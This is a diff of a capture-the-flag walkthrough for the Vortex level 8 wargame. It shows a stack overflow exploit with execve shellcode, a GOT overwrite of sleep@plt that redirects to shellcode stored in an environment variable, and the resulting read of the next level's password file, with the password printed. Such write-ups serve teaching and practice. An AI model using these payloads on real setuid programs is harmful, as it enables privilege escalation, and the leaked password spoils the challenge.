@@ -98,23 +98,24 @@ so we put 0xffffd2a0:
 ./vortex8 $(python -c 'print "a"*1036+"\xb0\xd2\xff\xff"+"\x90" * 64+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')  
 
 and you thought it was so easy... the catch is we're still vortex8 (remember the part where the syscall was?):  
-$ whoami
-vortex8
+$ whoami  
+vortex8  
 so, we need to figure out a different way...  
 we must somehow make the thread activate the shell, because the main function lacks the privliges...  
-OK, so we will use a method we previously used in the vortex series: function hijacking  
+OK, so we will use a method we previously used in the vortex series: global table function overwrite  
 Dump of assembler code for function sleep@plt:
 ```assembly
    0x080484e0 <+0>:     jmp    *0x804a014
    0x080484e6 <+6>:     push   $0x10
    0x080484eb <+11>:    jmp    0x80484b0
 ```
-so we need to overwrite: 0x80484e2  
+so we need to overwrite 0x80484e2 value:  
 0x80484e2 <sleep@plt+2>:        0x0804a014  
-export EGG
-EGG=$(python -c 'print "\x90"*64 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')
-and we want to change its value to the value of the address 0xffffd920 (env var named EGG with shell in it)
-thus, we need to change the shellcode in our buffer so that it will write 0xffffd920 to 0x804a014
+let's export a shellcode to a envp...  
+export EGG  
+EGG=$(python -c 'print "\x90"*64 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"')  
+and we want to change its value to the value of the address 0xffffd920 (env var named EGG with shell in it)  
+thus, we need to change the shellcode in our buffer so that it will write 0xffffd920 to 0x804a014  
 assembly code:
 ```assembly
 section .text                                                                
@@ -133,13 +134,13 @@ Disassembly of section .text:
  8048065:       c7 03 20 d9 ff ff       movl   $0xffffd94b,(%ebx)
 		eb f3			jmp main
 ```
---> \xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3
-so now we replace the shellcode with the following... (note: I had to change the return address to 0xffffd860, because I had to restart the session
-and as a result the adresses changed a lot...)
-/vortex/vortex8 $(python -c 'print "a"*1036+"\x60\xd8\xff\xff"+"\x90" * 64 + "\xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3"')
+--> \xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3  
+so now we replace the shellcode with the following... (note: I had to change the return address to 0xffffd860, because I had to restart the session and as a result the adresses changed a lot...)  
+let's put it all toghether:  
+/vortex/vortex8 $(python -c 'print "a"*1036+"\x60\xd8\xff\xff"+"\x90" * 64 + "\xbb\x14\xa0\x04\x08\xc7\x03\x20\xd9\xff\xff\xeb\xf3"')  
 
-at last, we get:
-$ whoami
-vortex9
-$ cat /etc/vortex_pass/vortex9
-ci41)GJhb
+at last, we get:  
+$ whoami  
+vortex9  
+$ cat /etc/vortex_pass/vortex9  
+ci41)GJhb  
